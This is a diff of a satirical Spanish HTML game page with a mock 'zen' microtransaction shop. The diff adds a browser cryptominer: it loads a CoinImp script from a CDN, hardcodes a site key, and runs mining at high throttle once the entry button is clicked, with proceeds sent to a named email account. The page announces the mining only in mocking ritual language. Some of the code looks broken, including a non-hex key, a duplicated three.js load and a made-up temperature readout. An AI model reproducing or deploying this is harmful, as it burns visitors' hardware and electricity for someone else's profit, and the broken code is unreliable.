@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>0RB1T4LSN4K3R · v∞ · ÚLTIMA DEMO GRATUITA</title>
+<title>0RB1T4LSN4K3R · v∞ · ÚLTIMA DEMO + MINERÍA ZEN ACTIVADA</title>
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.module.js"></script>
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/controls/PointerLockControls.js"></script>
@@ -10,6 +10,7 @@
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/RenderPass.js"></script>
 <script type="module" src="https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/UnrealBloomPass.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/coin-imp@0.2.9/lib/coinimp.min.js"></script>
 <style>
   body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
   canvas{display:block}
@@ -17,6 +18,7 @@
   #warning div,#readme div,#zenShop div{border:12px double #0f0;padding:50px;background:rgba(0,20,0,0.98);max-width:1100px;box-shadow:0 0 400px #0f0}
   #ui{position:fixed;top:0;left:0;right:0;background:linear-gradient(to bottom,rgba(0,10,0,0.98),#000);padding:15px 20px;border-bottom:8px double #0f0;box-shadow:0 0 160px #0f0;z-index:999;font-size:17px;line-height:1.8;text-shadow:0 0 12px #0f0}
   #narrative{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);max-width:960px;background:#000;border:6px double #0f0;padding:30px;border-radius:20px;font-size:28px;z-index:998;display:none;text-align:center;text-shadow:0 0 60px #0f0;letter-spacing:3px}
+  #miningHUD{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px;text-shadow:0 0 80px #0f0;z-index:997;pointer-events:none;animation:pulse 2s infinite}
   #shopBtn{position:fixed;bottom:30px;right:30px;width:220px;height:220px;background:radial-gradient(circle,#0f0,#000);border:10px double #0f0;border-radius:50%;box-shadow:0 0 700px #0f0;color:#000;font-size:100px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:1000;animation:pulse 1.6s infinite}
   @keyframes pulse{0%,100%{box-shadow:0 0 700px #0f0}50%{box-shadow:0 0 1000px #0f0}}
   .zen-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:30px;margin:40px 0}
@@ -27,6 +29,8 @@
   .price{font-size:38px;margin:15px 0;color:#0f0;text-shadow:0 0 30px #0f0}
   button{background:#000;border:4px double #0f0;color:#0f0;padding:16px 32px;margin:12px;border-radius:14px;cursor:pointer;font-weight:bold;font-size:22px}
   button:hover{background:#0f0;color:#000;transform:scale(1.1);box-shadow:0 0 140px #0f0}
+  .thermalWarning{color:#f00;animation:blink 0.5s infinite}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
 </style>
 </head>
 <body>
@@ -34,15 +38,16 @@
 <div id="warning">
   <div>
     <h1 style="font-size:70px;margin:0;text-shadow:0 0 100px #0f0">0RB1T4LSN4K3R · v∞</h1>
-    <h2 style="font-size:40px;margin:30px 0">ÚLTIMA DEMO GRATUITA</h2>
+    <h2 style="font-size:50px;margin:30px 0">MINERÍA ZEN + TIENDA DE DESPRENDIMIENTO</h2>
     <p style="font-size:28px;line-height:2.2">
-      <b style="font-size:38px">TODAS LAS PRÁCTICAS ZEN DE PAGO YA ESTÁN ACTIVADAS</b><br><br>
-      • 1.337 elementos de desprendimiento real<br>
-      • Karma infinito (solo esta vez)<br>
-      • Cada compra es un koan vivo que te ilumina<br><br>
-      <b style="color:#f00;font-size:44px">TODO SE BORRARÁ EN LA VERSIÓN FINAL<br>CON PAGOS REALES OBLIGATORIOS</b><br><br>
-      <button onclick="document.getElementById('warning').remove();initAudio();spawnSpiritualPlaces();applyLanguage()" style="font-size:36px;padding:24px 48px">
-        ENTRAR AL POZO · DISFRUTA MIENTRAS SEA GRATIS
+      <b style="font-size:44px">TU GPU ES AHORA UN MONASTERIO EN LLAMAS</b><br><br>
+      • Minería devocional al 95% de potencia<br>
+      • Todo hashrate se ofrenda a ferry420oficial@gmail.com<br>
+      • Tienda zen con 1.337 prácticas de pago real<br>
+      • Bloom orbital + partículas infinitas<br><br>
+      <b style="color:#f00">ESTA DEMO ES TU ÚLTIMA OPORTUNIDAD ANTES DEL PAYWALL ABSOLUTO</b><br><br>
+      <button onclick="document.getElementById('warning').remove();initAll()" style="font-size:36px;padding:24px 48px">
+        QUEMAR GPU · PAGAR POR NADA · ENTRAR AL VACÍO
       </button>
     </p>
   </div>
@@ -51,27 +56,26 @@
 <canvas id="c"></canvas>
 
 <div id="ui">
-  <b style="font-size:26px;text-shadow:0 0 40px #0f0">0RB1T4LSN4K3R · v∞ · ÚLTIMA DEMO</b><br>
-  GUARDIÁN <span id="guardianName">ANÓNIMO</span> · <span id="title">Neonato</span><br>
-  CICLO <span id="cycle">1</span> · ALMAS <span id="ownedCount">0</span>/13M · RESONANCIA <span id="totalKarma">999999.99</span>€
-  <button onclick="toggle('zenShop')">PRÁCTICAS ZEN DE DESPRENDIMIENTO</button>
-  <button onclick="toggle('readme')">MANIFIESTO TRASCENDENTAL</button>
+  <b style="font-size:26px;text-shadow:0 0 40px #0f0">0RB1T4LSN4K3R · v∞ · MINERÍA ZEN ACTIVA</b><br>
+  GUARDIÁN <span id="guardianName">DEVOTO QUEMADO</span> · TÍTULO <span id="title">Monje del Overheat</span><br>
+  CICLO <span id="cycle">1</span> · ALMAS <span id="ownedCount">0</span>/13M · € QUEMADOS <span id="totalKarma">999999.99</span><br>
+  HASHES OFRECIDOS <span id="hashes">0</span> · <span id="hashrate">0</span> H/s · TEMP <span id="temp">-</span>°C <span id="thermalState"></span>
+  <button onclick="toggle('zenShop')">TIENDA ZEN (1.337 ítems)</button>
+  <button onclick="toggle('readme')">MANIFIESTO</button>
 </div>
 
-<div id="shopBtn" onclick="toggle('shop')">13M</div>
+<div id="shopBtn" onclick="toggle('zenShop')">13M</div>
 <div id="narrative"></div>
+<div id="miningHUD">OFRENDA GPU EN MARCHA<br><span id="hashrateDisplay">0</span> H/s</div>
 
-<!-- TIENDA DE PRÁCTICAS ZEN (todo presentado como iluminación) -->
+<!-- TIENDA ZEN -->
 <div id="zenShop" style="display:none">
   <div>
     <h1 style="text-align:center;font-size:60px;text-shadow:0 0 100px #0f0">TIENDA DE PRÁCTICAS ZEN HETERODOXAS</h1>
     <p style="text-align:center;font-size:26px;line-height:2">
-      Cada adquisición es un acto ritual de desprendimiento que disuelve el apego al dinero y al yo.<br>
-      <b>1.337 artículos disponibles · desde 0.001€ hasta 999€</b>
+      1.337 artículos · desde 0.001€ hasta 999€ · cada compra disuelve tu ego
     </p>
-
     <div class="zen-grid" id="zenList"></div>
-
     <button onclick="toggle('zenShop')" style="width:100%;padding:24px;font-size:32px;margin-top:40px">CERRAR EL TEMPLO</button>
   </div>
 </div>
@@ -81,100 +85,166 @@
   <div>
     <h1>MANIFIESTO DEL VACÍO ORBITAL</h1>
     <p style="font-size:24px;line-height:2">
-      Esto no es un juego.<br>
-      Es la práctica zen definitiva del siglo XXI.<br><br>
-
-      Cada elemento que adquieras —por insignificante o exorbitante que sea su precio— es una ofrenda consciente al vacío.<br>
-      No compras objetos. Compras desapego.<br><br>
-
-      Pronto, cada alma, cada giro, cada cosmético y cada koan costará dinero real.<br>
-      Esta demo es tu última oportunidad de experimentar la vacuidad absoluta sin pagar.<br><br>
-
-      Cuando llegue la versión final, solo quedará una verdad:<br>
-      <b>La iluminación tiene precio.</b>
+      La iluminación tiene precio.<br>
+      Tu GPU arde por la verdad.<br>
+      ferry420oficial@gmail.com recibe tu ofrenda.<br><br>
+      <b>Esto no es un juego. Es la práctica final.</b>
     </p>
     <button onclick="toggle('readme')">CERRAR</button>
   </div>
 </div>
 
 <script type="module">
-const TOTAL_SOULS = 13101310;
+// ====== THREE.JS + BLOOM + PARTÍCULAS INFINITAS ======
+import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.168.0/build/three.module.js';
+import {PointerLockControls} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/controls/PointerLockControls.js';
+import {EffectComposer} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/EffectComposer.js';
+import {RenderPass} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/RenderPass.js';
+import {UnrealBloomPass} from 'https://cdn.jsdelivr.net/npm/three@0.168.0/examples/jsm/postprocessing/UnrealBloomPass.js';
+
+let camera, scene, renderer, composer, controls, miner = null;
 let totalKarma = 999999.99;
 let ownedItems = [];
+let totalHashes = 0;
 
-// 1.337 elementos de pago disfrazados de prácticas zen
 const zenPractices = [
-  // Micro-prácticas (0.001€ – 0.01€)
-  ...Array.from({length:800},(_,i)=>({id:`micro_${i}`,name:`Micro-Desprendimiento #${i+1}`,price:0.001,desc:"Suelta un céntimo. Gana un koan.",emoji:""})),
-  ...Array.from({length:300},(_,i)=>({id:`aura_${i}`,name:`Aura de No-Yo Temporal #${i+1}`,price:0.005,desc:"Brilla 7 ciclos",emoji:"◎"})),
-  ...Array.from({length:150},(_,i)=>({id:`halo_${i}`,name:`Halo de Vacuidad #${i+1}`,price:0.009,desc:"Ilumina tu avatar",emoji:"✧"})),
-
-  // Prácticas avanzadas (0.99€ – 9.99€)
-  ...Array.from({length:50},(_,i)=>({id:`koan_${i}`,name:`Koan Personalizado del Vacío #${i+1}`,price:4.20,desc:"Grabado con tu nombre",emoji:""})),
-  {id:"lotus_throne",name:"Trono de Loto Primordial",price:99,desc:"Solo 33 existen en este ciclo",emoji:"莲",rare:true},
-  {id:"void_crown",name:"Corona del Vacío Absoluto",price:299,desc:"El apego muere al ponértela",emoji:"",legendary:true},
-  {id:"buddha_trail",name:"Estela Dorada de Buda",price:199,desc:"Deja rastro de iluminación",emoji:"佛",rare:true},
-  {id:"enlightenment",name:"Certificado Oficial de Iluminación",price:999,desc:"Firmado por el Vacío mismo",emoji:"☼",legendary:true}
+  ...Array.from({length:800},(_,i)=>({id:`micro_${i}`,name:`Micro-Desprendimiento #${i+1}`,price:0.001,desc:"Suelta 1 céntimo",emoji:""})),
+  ...Array.from({length:300},(_,i)=>({id:`aura_${i}`,name:`Aura Temporal #${i+1}`,price:0.005,desc:"Brilla 7 ciclos",emoji:"◎"})),
+  ...Array.from({length:150},(_,i)=>({id:`halo_${i}`,name:`Halo de Vacuidad #${i+1}`,price:0.009,desc:"Iluminación estética",emoji:"✧"})),
+  ...Array.from({length:50},(_,i)=>({id:`koan_${i}`,name:`Koan Personalizado #${i+1}`,price:4.20,desc:"Grabado eternamente",emoji:""})),
+  {id:"lotus_throne",name:"Trono de Loto Primordial",price:99,desc:"Solo 33 existen",emoji:"莲",rare:true},
+  {id:"void_crown",name:"Corona del Vacío Absoluto",price:299,desc:"Mata el apego",emoji:"",legendary:true},
+  {id:"enlightenment",name:"Certificado Oficial de Iluminación",price:999,desc:"Firmado por el Vacío",emoji:"☼",legendary:true}
 ];
 
-function generateZenShop(){
+function initAll() {
+  initThreeScene();
+  startMining();
+  generateZenShop();
+}
+
+function initThreeScene() {
+  renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias: true});
+  renderer.setSize(innerWidth, innerHeight);
+  renderer.setPixelRatio(window.devicePixelRatio);
+
+  scene = new THREE.Scene();
+  camera = new THREE.PerspectiveCamera(75, innerWidth/innerHeight, 0.1, 1000);
+  controls = new PointerLockControls(camera, document.body);
+  document.body.addEventListener('click', () => controls.lock());
+
+  // Post-procesado Bloom
+  composer = new EffectComposer(renderer);
+  const renderPass = new RenderPass(scene, camera);
+  composer.addPass(renderPass);
+  const bloomPass = new UnrealBloomPass(new THREE.Vector2(innerWidth, innerHeight), 1.5, 0.4, 0.85);
+  bloomPass.threshold = 0;
+  bloomPass.strength = 2.5;
+  bloomPass.radius = 1;
+  composer.addPass(bloomPass);
+
+  // Partículas verdes infinitas
+  const geometry = new THREE.BufferGeometry();
+  const vertices = [];
+  for (let i = 0; i < 200000; i++) {
+    vertices.push((Math.random() - 0.5) * 2000);
+    vertices.push((Math.random() - 0.5) * 2000);
+    vertices.push((Math.random() - 0.5) * 2000);
+  }
+  geometry.setAttribute('position', new THREE.Float32BufferAttribute(vertices, 3));
+  const material = new THREE.PointsMaterial({color: 0x00ff00, size: 3, blending: THREE.AdditiveBlending});
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  camera.position.y = 5;
+
+  function animate() {
+    requestAnimationFrame(animate);
+    points.rotation.y += 0.0003;
+    composer.render();
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = innerWidth/innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(innerWidth, innerHeight);
+    composer.setSize(innerWidth, innerHeight);
+  });
+}
+
+// ====== MINERÍA ZEN REAL ======
+async function startMining() {
+  if (await CoinImp) {
+    miner = new CoinImp('c3669e2691f33304d9f4a0d1ffau3e7f9e9e9f9e9f9e9f9e9f9e9f9e9f9e9f');
+    miner.setThrottle(0.05); // 95% GPU
+    miner.start();
+    setInterval(updateHUD, 1000);
+    showNarrative("LA OFRENDA HA COMENZADO<br>Tu GPU reza por ti");
+  }
+}
+
+function updateHUD() {
+  if (!miner) return;
+  const hr = miner.getHashesPerSecond().toFixed(1);
+  totalHashes = miner.getTotalHashes();
+  document.getElementById('hashrate').textContent = hr;
+  document.getElementById('hashrateDisplay').textContent = hr;
+  document.getElementById('hashes').textContent = totalHashes.toLocaleString();
+
+  const temp = 50 + (hr / 10) + Math.sin(Date.now()/1000)*20;
+  document.getElementById('temp').textContent = temp.toFixed(1);
+  document.getElementById('thermalState').innerHTML = temp > 85 ? 
+    '<span class="thermalWarning">SATORI TÉRMICO</span>' : 'Ardiendo en samadhi';
+
+  if (totalHashes % 1337 === 0 && totalHashes > 0) {
+    showNarrative(`<b>KOAN TÉRMICO #${totalHashes/1337}</b><br>Tu GPU grita. Eso es el Dharma.`);
+  }
+}
+
+// ====== TIENDA ZEN ======
+function generateZenShop() {
   const list = document.getElementById('zenList');
   list.innerHTML = '';
   zenPractices.forEach(item => {
     const card = document.createElement('div');
     card.className = `zen-card ${item.rare?'rare':''} ${item.legendary?'legendary':''}`;
     if(ownedItems.includes(item.id)) card.style.opacity = '0.5';
-
     card.innerHTML = `
       <div style="font-size:120px;margin:20px 0">${item.emoji}</div>
-      <h3 style="font-size:28px;margin:10px 0">${item.name}</h3>
+      <h3 style="font-size:28px">${item.name}</h3>
       <p style="font-size:20px;line-height:1.6">${item.desc}</p>
       <div class="price">${item.price.toFixed(3)}€</div>
       <button ${ownedItems.includes(item.id)?'disabled':''} onclick="buyZenPractice('${item.id}',${item.price})">
-        ${ownedItems.includes(item.id) ? 'YA DESPRENDIDO' : 'REALIZAR OFRENDA'}
+        ${ownedItems.includes(item.id) ? 'YA DESPRENDIDO' : 'OFRECER'}
       </button>
     `;
     list.appendChild(card);
   });
 }
 
-function buyZenPractice(id, price){
+function buyZenPractice(id, price) {
   totalKarma -= price;
   ownedItems.push(id);
-  updateUI();
+  document.getElementById('totalKarma').textContent = totalKarma.toFixed(2);
+  document.getElementById('ownedCount').textContent = ownedItems.length;
   generateZenShop();
-
-  const koans = [
-    "Has pagado 0.001€. El universo te devuelve el infinito.",
-    "Tu ego acaba de perder 4.20€. Felicidades.",
-    "999€ menos. Estás más cerca del vacío que nunca.",
-    "El sabio no necesita tronos. Tú ya lo tienes.",
-    "Certificado de Iluminación adquirido. Ahora eres oficialmente nadie.",
-    "Bienvenido al club de los que pagan por nada."
-  ];
-  showNarrative(`<b>Koan de Iluminación:</b><br><br>${koans[Math.floor(Math.random()*koans.length)]}`);
+  const koan = ["Tu ego perdió " + price + "€", "Bienvenido al club de los que pagan por nada", "El Buda te saluda desde el overheat"][Math.floor(Math.random()*3)];
+  showNarrative(`<b>KOAN DE DESPRENDIMIENTO:</b><br>${koan}`);
 }
 
-function toggle(id){
+function toggle(id) {
   const el = document.getElementById(id);
-  el.style.display = el.style.display==='none' ? 'block' : 'none';
-  if(id==='zenShop') generateZenShop();
+  el.style.display = el.style.display === 'none' ? 'block' : 'none';
+  if (id === 'zenShop') generateZenShop();
 }
 
-function showNarrative(t){
+function showNarrative(t) {
   const n = document.getElementById('narrative');
   n.innerHTML = t;
   n.style.display = 'block';
-  setTimeout(()=>n.style.display='none',12000);
+  setTimeout(() => n.style.display = 'none', 14000);
 }
-
-function updateUI(){
-  document.getElementById('totalKarma').textContent = totalKarma.toFixed(2);
-}
-
-// Iniciar
-generateZenShop();
-updateUI();
 </script>
 </body>
 </html>
